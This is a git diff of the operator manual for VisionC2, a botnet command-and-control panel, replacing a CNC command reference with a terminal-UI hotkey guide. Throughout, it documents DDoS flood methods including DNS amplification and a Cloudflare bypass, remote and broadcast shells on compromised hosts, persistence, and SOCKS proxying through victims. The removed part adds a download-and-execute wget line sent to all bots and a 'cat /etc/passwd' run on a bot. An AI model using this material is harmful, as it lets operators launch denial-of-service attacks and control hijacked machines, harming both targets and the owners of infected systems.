@@ -1,367 +1,512 @@
-# ☾℣☽ VisionC2 Command Reference
+# ☾℣☽ VisionC2 TUI Command Reference
 
-> Complete documentation for all CNC commands with examples and permission requirements.
-
----
-
-## 📊 Permission Levels
-
-| Level | Access |
-|-------|--------|
-| **Owner** | Full access - all commands including database management |
-| **Admin** | Bot management, shell access, all attacks |
-| **Pro** | Attack commands, bot targeting, SOCKS proxy |
-| **Basic** | Attack commands only |
+> Complete hotkey and command reference for the VisionC2 Terminal User Interface.
 
 ---
 
-## 🎛️ General Commands
+## 🚀 Quick Start
 
-Commands available to all authenticated users.
+```bash
+# Start TUI (default)
+./cnc
+
+# Start split mode (telnet server)
+./cnc --split
+```
+
+---
+
+## 🎛️ Global Hotkeys
+
+These work in most views:
+
+| Key | Action |
+|-----|--------|
+| `↑` / `k` | Move up |
+| `↓` / `j` | Move down |
+| `←` / `→` | Switch tabs/views |
+| `Enter` | Select / Confirm |
+| `q` | Back / Quit |
+| `Esc` | Cancel / Exit mode |
+| `r` | Refresh data |
+
+---
+
+## 📊 Dashboard
+
+The main menu screen.
+
+| Key | Action |
+|-----|--------|
+| `↑/↓` | Navigate menu |
+| `Enter` | Select menu item |
+| `q` | Quit application |
+
+### Menu Items
+
+| Item | Description |
+|------|-------------|
+| 🤖 Bot List | View and manage connected bots |
+| ⚡ Launch Attack | Interactive attack builder |
+| 📊 Ongoing Attacks | Monitor active attacks |
+| 🧦 Socks Manager | SOCKS5 proxy management |
+| 📜 Connection Logs | Bot connection history |
+| ❓ Help | In-app help guide |
+
+---
+
+## 🤖 Bot List View
+
+View all connected bots with live status.
+
+### Display Columns
+
+| Column | Description |
+|--------|-------------|
+| ID | 8-character bot identifier |
+| IP | Bot's IP address and port |
+| Arch | CPU architecture (amd64, arm64, etc.) |
+| RAM | System memory in MB |
+| Uptime | Time since bot connected |
+
+### Hotkeys
+
+| Key | Action | Description |
+|-----|--------|-------------|
+| `Enter` | Remote Shell | Open interactive shell to selected bot |
+| `b` | Broadcast Shell | Open shell to ALL bots |
+| `l` | Launch Attack | Attack using selected bot |
+| `i` | Info | Request `!info` from selected bot |
+| `p` | Persist | Send `!persist` (prompts confirmation) |
+| `r` | Reinstall | Send `!reinstall` (prompts confirmation) |
+| `k` | Kill | Send `!lolnogtfo` (requires y/n) |
+| `q` | Back | Return to dashboard |
+
+### Confirmation Prompts
+
+For dangerous commands (`p`, `r`, `k`), you'll see:
+
+```
+⚠ Send !persist to bot a1b2c3d4? [y/n]
+```
+
+Press `y` to confirm or `n`/`Esc` to cancel.
+
+---
+
+## 💻 Remote Shell View
+
+Interactive shell session with a single bot.
+
+### Interface
+
+```
+💻 REMOTE SHELL
+Bot: a1b2c3d4     │ Arch: amd64
+────────────────────────────────────────────────
+
+[command output appears here]
+
+root@bot:~$ █
+```
+
+### Hotkeys
+
+| Key | Action | Description |
+|-----|--------|-------------|
+| `Enter` | Send | Execute typed command |
+| `Ctrl+F` | Clear | Clear shell history |
+| `Ctrl+P` | Persist | Send `!persist` (confirms) |
+| `Ctrl+R` | Reinstall | Send `!reinstall` (confirms) |
+| `Esc` | Exit | Return to bot list |
+
+### Command Types
+
+| Prefix | Behavior |
+|--------|----------|
+| (none) | Sent as `!shell <cmd>` - waits for output |
+| `!` | Sent directly (e.g., `!info`, `!detach ls`) |
+
+---
+
+## 📡 Broadcast Shell View
+
+Send commands to multiple bots simultaneously.
+
+### Interface
+
+```
+📡 BROADCAST SHELL                              [47 bots]
+────────────────────────────────────────────────
+
+Filter: All Bots
+
+broadcast:~$ █
+```
+
+### Hotkeys
+
+| Key | Action | Description |
+|-----|--------|-------------|
+| `Enter` | Send | Execute to all filtered bots |
+| `Ctrl+F` | Clear | Clear shell history |
+| `Ctrl+A` | Arch Filter | Filter by architecture |
+| `Ctrl+G` | RAM Filter | Filter by minimum RAM |
+| `Ctrl+B` | Max Bots | Limit number of targets |
+| `Ctrl+P` | Persist All | Send `!persist` to all (confirms) |
+| `Ctrl+R` | Reinstall All | Send `!reinstall` to all (confirms) |
+| `Ctrl+K` | Kill All | Send `!lolnogtfo` to all (confirms) |
+| `Esc` | Exit | Return to bot list |
+
+### Targeting Filters
+
+**Architecture Filter (`Ctrl+A`):**
+
+```
+Filter by Arch: amd64█
+```
+
+Enter architecture name (amd64, arm64, mips, etc.) or leave empty for all.
+
+**RAM Filter (`Ctrl+G`):**
+
+```
+Min RAM (MB): 1024█
+```
+
+Only target bots with at least this much RAM.
+
+**Max Bots (`Ctrl+B`):**
+
+```
+Max Bots: 10█
+```
+
+Limit commands to first N matching bots.
+
+---
+
+## ⚡ Launch Attack View
+
+Interactive attack configuration form.
+
+### Interface
+
+```
+⚡ LAUNCH ATTACK
+
+▸ Method:    [!udpflood          ▼]
+  Target:    192.168.1.100
+  Port:      80
+  Duration:  60
+
+[tab] Next  [enter] Select Method  [l] Launch  [q] Cancel
+```
+
+### Hotkeys
+
+| Key | Action |
+|-----|--------|
+| `Tab` | Next field |
+| `Enter` | Open method selector (when on Method) |
+| `l` | Launch attack |
+| `q` | Cancel and go back |
+| `Backspace` | Delete character |
+
+### Attack Methods
+
+#### Layer 4 (Network)
+
+| Method | Description |
+|--------|-------------|
+| `!udpflood` | UDP packet flood |
+| `!tcpflood` | TCP connection flood |
+| `!syn` | SYN flood attack |
+| `!ack` | ACK flood attack |
+| `!gre` | GRE protocol flood |
+| `!dns` | DNS amplification |
+
+#### Layer 7 (Application)
+
+| Method | Description |
+|--------|-------------|
+| `!http` | HTTP GET/POST flood |
+| `!https` | HTTPS/TLS flood |
+| `!tls` | TLS flood (alias) |
+| `!cfbypass` | Cloudflare bypass |
+
+### Method Selector
+
+Press `Enter` on the Method field to open:
+
+```
+SELECT ATTACK METHOD
+
+Layer 4:
+  ▸ !udpflood    UDP packet flood
+    !tcpflood    TCP connection flood
+    !syn         SYN flood attack
+    ...
+
+[↑/↓] Navigate  [enter] Select  [q] Cancel
+```
+
+---
+
+## 📊 Ongoing Attacks View
+
+Monitor and manage active attacks.
+
+### Interface
+
+```
+ONGOING ATTACKS                                 [2 active]
+
+!udpflood → 192.168.1.100:80    ████████░░  45s left
+!https    → example.com:443     ██████████  2m 30s left
+
+[s] Stop All  [r] Refresh  [q] Back
+```
+
+### Hotkeys
+
+| Key | Action |
+|-----|--------|
+| `s` | Stop all attacks |
+| `r` | Refresh status |
+| `q` | Back to dashboard |
+
+---
+
+## 🧦 Socks Manager View
+
+Manage SOCKS5 reverse proxies through bots.
+
+### Interface
+
+```
+🧦 SOCKS5 PROXY MANAGER
+
+[All Bots]  Active Socks   Stopped
+────────────────────────────────────────────────
+
+Bots: 47   Active Proxies: 3   Bind: 0.0.0.0
+
+BOT ID          IP              ARCH      PORT    STATUS
+────────────────────────────────────────────────────────
+▸ a1b2c3d4     192.168.1.100   amd64     1080    ● ACTIVE
+  e5f6g7h8     10.0.0.50       arm64     1080    ● ACTIVE
+  x9y8z7w6     172.16.0.25     mips      -       - NONE
+```
+
+### View Modes
+
+| Tab | Shows |
+|-----|-------|
+| All Bots | Every connected bot |
+| Active Socks | Bots with running proxies |
+| Stopped | Bots with stopped proxies |
+
+### Hotkeys
+
+| Key | Action | Description |
+|-----|--------|-------------|
+| `↑/↓` | Navigate | Select bot |
+| `←/→` | Switch View | Change tab |
+| `s` | Start Socks | Start proxy on selected bot |
+| `x` | Stop Socks | Stop proxy on selected bot |
+| `r` | Refresh | Update status |
+| `q` | Back | Return to dashboard |
+
+### Starting a Proxy
+
+1. Select a bot with `↑/↓`
+2. Press `s`
+3. Enter port (default: 1080)
+4. Press `Enter`
+
+```
+START SOCKS5 PROXY
+Bot: a1b2c3d4
+▸ Port: 1080█
+
+[enter] Start  [esc] Cancel
+```
+
+### Using the Proxy
+
+After starting, connect via:
+
+```bash
+# Configure proxychains
+echo "socks5 BOT_IP 1080" >> /etc/proxychains.conf
+
+# Or use curl directly
+curl --socks5 BOT_IP:1080 http://example.com
+```
+
+---
+
+## 📜 Connection Logs View
+
+View bot connection and disconnection history.
+
+### Interface
+
+```
+CONNECTION LOGS
+
+[All]  Connections   Disconnections
+────────────────────────────────────────────────
+
+14:32:05  CONNECT     a1b2c3d4    192.168.1.100    amd64
+14:30:22  DISCONNECT  x9y8z7w6    172.16.0.25      mips
+14:28:15  CONNECT     e5f6g7h8    10.0.0.50        arm64
+```
+
+### View Modes
+
+| Tab | Shows |
+|-----|-------|
+| All | All events |
+| Connections | New bot connections only |
+| Disconnections | Bot disconnections only |
+
+### Hotkeys
+
+| Key | Action |
+|-----|--------|
+| `←/→` | Switch filter |
+| `r` | Refresh logs |
+| `q` | Back to dashboard |
+
+---
+
+## ❓ Help View
+
+In-app help with navigation sections.
+
+### Hotkeys
+
+| Key | Action |
+|-----|--------|
+| `←/→` or `h/l` | Navigate sections |
+| `q` | Back to dashboard |
+
+---
+
+## 🔧 Split Mode Commands
+
+When running `./cnc --split`, connect via netcat/telnet:
+
+```bash
+nc YOUR_SERVER 420
+```
+
+### Authentication
+
+1. Type trigger word: `spamtec`
+2. Enter username and password
+
+### Available Commands
 
 | Command | Description |
 |---------|-------------|
-| `help` | Display context-aware help menu based on your permission level |
-| `attack` / `methods` | Display all available attack methods |
-| `?` | Quick hint showing help and attack commands |
-| `bots` | List all connected bots with details |
-| `banner` | Redisplay the VisionC2 banner with live stats |
-| `clear` / `cls` | Clear the terminal screen |
-| `ongoing` | Show currently running attacks |
-| `logout` / `exit` | Disconnect from the C2 server |
+| `help` | Show command menu |
+| `attack` / `methods` | List attack methods |
+| `bots` | List connected bots |
+| `ongoing` | Show active attacks |
+| `clear` / `cls` | Clear screen |
+| `banner` | Show banner |
+| `logout` / `exit` | Disconnect |
 
-### Examples
-
-```
-[Owner@root]► help
-# Displays command menu (general, shell, bot management, etc.)
-
-[Owner@root]► attack
-# Displays all attack methods (L4, L7, proxy mode)
-
-[Owner@root]► ?
-'help' - commands  |  'attack' - attack methods
-
-[Owner@root]► bots
-[Bots: 47]
-Connected Bots:
-──────────────────────────────────────
-  ID: a1b2c3d4 | IP: 192.168.1.100:45231 | Arch: amd64 | RAM: 4.0GB
-      Uptime: 2h15m30s | Last: 5s
-  ID: e5f6g7h8 | IP: 10.0.0.50:38422 | Arch: arm64 | RAM: 1.0GB
-      Uptime: 45m12s | Last: 3s
-
-[Owner@root]► ongoing
-Ongoing Attacks:
-  !udpflood -> 192.168.1.1:80 (45s remaining)
-  !http -> example.com:443 (2m30s remaining)
-```
-
----
-
-## ⚡ Attack Commands
-
-**Required Level:** Basic+
-
-All attack commands are broadcast to ALL connected bots simultaneously.
-
-### Layer 4 Attacks (Network Layer)
-
-| Command | Description | Use Case |
-|---------|-------------|----------|
-| `!udpflood` | UDP packet flood | Saturate bandwidth |
-| `!tcpflood` | TCP connection flood | Exhaust connection tables |
-| `!syn` | SYN flood attack | Half-open connection exhaustion |
-| `!ack` | ACK flood attack | Firewall/IDS bypass |
-| `!gre` | GRE protocol flood | Infrastructure attacks |
-| `!dns` | DNS amplification | Reflected amplification |
-
-### Layer 7 Attacks (Application Layer)
-
-| Command | Description | Use Case |
-|---------|-------------|----------|
-| `!http` | HTTP GET/POST flood | Web server exhaustion |
-| `!https` | HTTPS/TLS flood | Encrypted layer 7 |
-| `!tls` | TLS flood (alias) | Same as !https |
-| `!cfbypass` | Cloudflare bypass | UAM/challenge solving |
-
-### Syntax
+### Attack Syntax
 
 ```
-!<method> <target> <port> <duration> [-p <proxy_url>]
+!<method> <target> <port> <duration>
 ```
 
-### Examples
-
-```bash
-# Basic UDP flood for 60 seconds
-[Admin@root]► !udpflood 192.168.1.100 80 60
-⚡ Target: 192.168.1.100
-⚡ Port: 80
-⚡ Duration: 60s
-⚡ Method: !udpflood
-
-# HTTPS flood against a website
-[Admin@root]► !https example.com 443 120
-
-# HTTP flood with proxy support (L7 only)
-[Admin@root]► !http target.com 443 60 -p https://proxylist.com/proxies.txt
-⚡ Target: target.com
-⚡ Port: 443
-⚡ Duration: 60s
-⚡ Method: !http
-⚡ Proxy Mode: Enabled (fetching from https://proxylist.com/proxies.txt)
-
-# Cloudflare bypass attack
-[Admin@root]► !cfbypass protected-site.com 443 180
-
-# Stop all running attacks
-[Admin@root]► !stop
-✓ Stopped 3 attack(s). Kill signal sent to all bots.
-```
-
-### Proxy Mode
-
-Layer 7 attacks (`!http`, `!https`, `!tls`, `!cfbypass`) support proxy mode:
-
-```bash
-!http target.com 443 60 -p http://example.com/proxies.txt
-```
-
-The proxy file should contain one proxy per line in format:
-
-```
-ip:port
-ip:port:user:pass
-http://ip:port
-socks5://ip:port
-```
-
----
-
-## 🖥️ Shell Commands
-
-**Required Level:** Admin+
-
-Execute commands on all bots or specific targets.
+### Shell Commands
 
 | Command | Description |
 |---------|-------------|
-| `!shell <cmd>` | Execute command, wait for output |
+| `!shell <cmd>` | Execute with output |
+| `!detach <cmd>` | Execute in background |
 | `!exec <cmd>` | Alias for !shell |
-| `!detach <cmd>` | Execute in background (no output) |
-| `!bg <cmd>` | Alias for !detach |
-| `!stream <cmd>` | Real-time output streaming |
 
-### Examples
+### Bot Management
 
-```bash
-# Get system information from all bots
-[Admin@root]► !shell uname -a
-Shell command sent to all bots: uname -a
-Waiting for bot responses...
+| Command | Description |
+|---------|-------------|
+| `!info` | Get bot system info |
+| `!persist` | Setup persistence |
+| `!reinstall` | Force reinstall |
+| `!lolnogtfo` | Kill bots |
 
-[Bot: a1b2c3d4] Shell Output:
-══════════════════════════════════════════════════════════
-Linux server1 5.15.0-generic #1 SMP x86_64 GNU/Linux
-══════════════════════════════════════════════════════════
-
-# List running processes
-[Admin@root]► !shell ps aux | head -20
-
-# Download and execute (background)
-[Admin@root]► !detach wget http://example.com/script.sh -O /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh
-Detached command sent to all bots: wget http://example.com/script.sh...
-
-# Check disk space
-[Admin@root]► !shell df -h
-
-# Get network connections
-[Admin@root]► !shell netstat -tulpn
-```
-
----
-
-## 🎯 Bot Targeting
-
-**Required Level:** Pro+
-
-Send commands to specific bots instead of broadcasting to all.
-
-### Syntax
+### Targeting Specific Bot
 
 ```
 !<botid> <command>
 ```
 
-Bot IDs support partial matching (prefix match).
+Example: `!a1b2c3d4 !shell whoami`
 
-### Examples
-
-```bash
-# List bots first to get IDs
-[Pro@user]► bots
-Connected Bots:
-  ID: a1b2c3d4e5f6 | IP: 192.168.1.100:45231 | Arch: amd64
-  ID: x9y8z7w6v5u4 | IP: 10.0.0.50:38422 | Arch: arm64
-
-# Target specific bot by full ID
-[Pro@user]► !a1b2c3d4e5f6 !shell whoami
-Command sent to bot a1b2c3d4e5f6: !shell whoami
-Waiting for response...
-
-# Target by partial ID (prefix match)
-[Pro@user]► !a1b2 !shell cat /etc/passwd
-Command sent to bot a1b2c3d4e5f6: !shell cat /etc/passwd
-
-# Run attack on single bot
-[Pro@user]► !x9y8 !udpflood 192.168.1.1 80 30
-
-# Get info from specific bot
-[Admin@root]► !a1b2 !info
-```
-
----
-
-## 🤖 Bot Management
-
-**Required Level:** Admin+
-
-Commands for managing the bot lifecycle.
+### SOCKS Proxy
 
 | Command | Description |
 |---------|-------------|
-| `!info` | Request system info from all bots |
-| `!persist` | Setup boot persistence (cron/systemd/init) |
-| `!reinstall` | Force bots to re-download and reinstall |
-| `!lolnogtfo` | Kill and remove bot from system |
-
-### Examples
-
-```bash
-# Get detailed info from all bots
-[Admin@root]► !info
-Info request sent to all bots
-
-# Setup persistence on all bots
-[Admin@root]► !persist
-Persistence command sent to all bots
-
-# Force update/reinstall all bots
-[Admin@root]► !reinstall
-Reinstall command sent to all bots
-
-# Remove all bots (nuclear option)
-[Admin@root]► !lolnogtfo
-Kill command sent to all bots
-```
-
----
-
-## 🌐 SOCKS Proxy
-
-**Required Level:** Pro+
-
-Establish SOCKS5 reverse proxies through bots.
-
-| Command | Description |
-|---------|-------------|
-| `!socks <port>` | Start SOCKS5 proxy on specified port |
-| `!stopsocks` | Stop all SOCKS5 proxies |
-
-### Examples
-
-```bash
-# Start SOCKS5 proxy on port 1080
-[Pro@user]► !socks 1080
-SOCKS5 proxy started on port 1080 for all bots
-
-# Use with proxychains or browser
-# Configure: socks5://bot_ip:1080
-
-# Stop all proxies
-[Pro@user]► !stopsocks
-SOCKS5 proxy stop command sent to all bots
-```
-
----
-
-## 🔐 Owner Commands
-
-**Required Level:** Owner only
-
-Sensitive administrative commands.
-
-| Command | Description |
-|---------|-------------|
-| `db` | View user database with credentials |
-| `private` | Show private command list |
-
-### Examples
-
-```bash
-# View all users and credentials
-[Owner@root]► db
-════════════════════ User Database ════════════════════
-  1. User: root            Pass: s3cr3tp@ss     Level: Owner    Expires: N/A
-  2. User: admin           Pass: adm1n123       Level: Admin    Expires: 2026-12-31 [328d]
-  3. User: user1           Pass: basicpass      Level: Basic    Expires: 2026-06-15 [EXPIRED]
-═══════════════════════════════════════════════════════
-
-# Show private commands
-[Owner@root]► private
-=== Private Commands (Owner Only) ===
-db            - Show user database
-```
+| `!socks <port>` | Start SOCKS5 on port |
+| `!stopsocks` | Stop all proxies |
 
 ---
 
 ## 📋 Quick Reference Card
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                    VisionC2 Quick Reference                 │
-├─────────────────────────────────────────────────────────────┤
-│ GENERAL                                                     │
-│   help          Show commands       bots     List agents    │
-│   clear         Clear screen        ongoing  Show attacks   │
-│   banner        Show banner         exit     Disconnect     │
-├─────────────────────────────────────────────────────────────┤
-│ ATTACKS (Basic+)                                            │
-│   !udpflood <ip> <port> <time>      !syn <ip> <port> <time> │
-│   !tcpflood <ip> <port> <time>      !ack <ip> <port> <time> │
-│   !http <url> <port> <time>         !gre <ip> <port> <time> │
-│   !https <url> <port> <time>        !dns <ip> <port> <time> │
-│   !cfbypass <url> <port> <time>     !stop  Stop all attacks │
-├─────────────────────────────────────────────────────────────┤
-│ SHELL (Admin+)                                              │
-│   !shell <cmd>    Execute + output  !detach <cmd>  Background│
-├─────────────────────────────────────────────────────────────┤
-│ BOT MGMT (Admin+)                                           │
-│   !info       Get bot info          !persist    Setup persist│
-│   !reinstall  Force reinstall       !lolnogtfo  Kill bots   │
-├─────────────────────────────────────────────────────────────┤
-│ TARGETING (Pro+)                                            │
-│   !<botid> <cmd>   Send to specific bot (supports prefix)   │
-├─────────────────────────────────────────────────────────────┤
-│ PROXY (Pro+)                                                │
-│   !socks <port>    Start SOCKS5     !stopsocks  Stop proxy  │
-├─────────────────────────────────────────────────────────────┤
-│ OWNER ONLY                                                  │
-│   db              View user database                        │
-│   private         Show private commands                     │
-└─────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────────┐
+│                    VisionC2 TUI Quick Reference                 │
+├─────────────────────────────────────────────────────────────────┤
+│ GLOBAL                                                          │
+│   ↑/↓/j/k   Navigate          Enter    Select/Confirm          │
+│   ←/→       Switch tabs       q        Back/Quit                │
+│   r         Refresh           Esc      Cancel                   │
+├─────────────────────────────────────────────────────────────────┤
+│ BOT LIST                                                        │
+│   Enter     Remote shell      b        Broadcast shell          │
+│   l         Launch attack     i        Request info             │
+│   p         Persist (y/n)     r        Reinstall (y/n)          │
+│   k         Kill bot (y/n)                                      │
+├─────────────────────────────────────────────────────────────────┤
+│ REMOTE SHELL                                                    │
+│   Ctrl+F    Clear output      Ctrl+P   Persist                  │
+│   Ctrl+R    Reinstall         Esc      Exit shell               │
+├─────────────────────────────────────────────────────────────────┤
+│ BROADCAST SHELL                                                 │
+│   Ctrl+A    Filter arch       Ctrl+G   Filter RAM               │
+│   Ctrl+B    Max bots          Ctrl+K   Kill all                 │
+│   Ctrl+P    Persist all       Ctrl+R   Reinstall all            │
+├─────────────────────────────────────────────────────────────────┤
+│ ATTACK VIEW                                                     │
+│   Tab       Next field        Enter    Select method            │
+│   l         Launch attack     q        Cancel                   │
+├─────────────────────────────────────────────────────────────────┤
+│ SOCKS MANAGER                                                   │
+│   s         Start socks       x        Stop socks               │
+│   ←/→       Switch view       r        Refresh                  │
+├─────────────────────────────────────────────────────────────────┤
+│ ONGOING ATTACKS                                                 │
+│   s         Stop all attacks  r        Refresh                  │
+└─────────────────────────────────────────────────────────────────┘
 ```
 
 ---
 
 ## ⚠️ Notes
 
-- **Duration** is always in seconds
-- **Port 443** is used for bot-to-CNC communication (TLS encrypted)
-- Bots auto-reconnect if connection is lost
-- Dead bots are automatically cleaned up after 5 minutes of no response
-- All commands are logged server-side
+- TUI requires minimum terminal size of 80x24
+- All bot commands are logged server-side
+- Dangerous commands (persist, reinstall, kill) require confirmation
+- Dead bots are automatically cleaned up after 5 minutes
 
 ---
 
